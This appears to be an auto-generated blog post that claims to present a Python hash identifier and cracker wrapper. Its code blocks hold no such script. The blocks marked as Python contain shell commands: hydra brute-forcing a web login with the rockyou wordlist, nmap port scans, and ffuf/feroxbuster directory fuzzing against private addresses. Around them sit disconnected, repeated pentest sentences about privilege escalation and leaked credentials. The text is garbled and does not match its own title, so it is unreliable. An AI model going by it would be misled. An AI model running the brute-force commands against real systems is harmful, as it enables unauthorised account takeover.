---
TitleSEO: "Hash Identifier and Cracker Wrapper in Python | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — Python"
Author: "ZureFX"
Description: "A Python script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "bash, c, powershell, python, fuzzer, script"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-750.html"
URL_IMAGES: ""
Date: "2024-11-10"
Tags: "Bash, C, PowerShell, Python, Fuzzer, Script"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-750"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-750.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `kerbrute`
- `kerbrute`
- `evil-winrm`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```python
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.51.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.225.199/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.166.228 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p1433,53,5432 10.100.62.121 -oN scan.txt
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p993,25,135 10.80.219.12 -oN scan.txt
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
nmap -sCV -p464,21,995 10.73.126.126 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.139.85/FUZZ
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 8 results
[+] Done in 4.64s
```
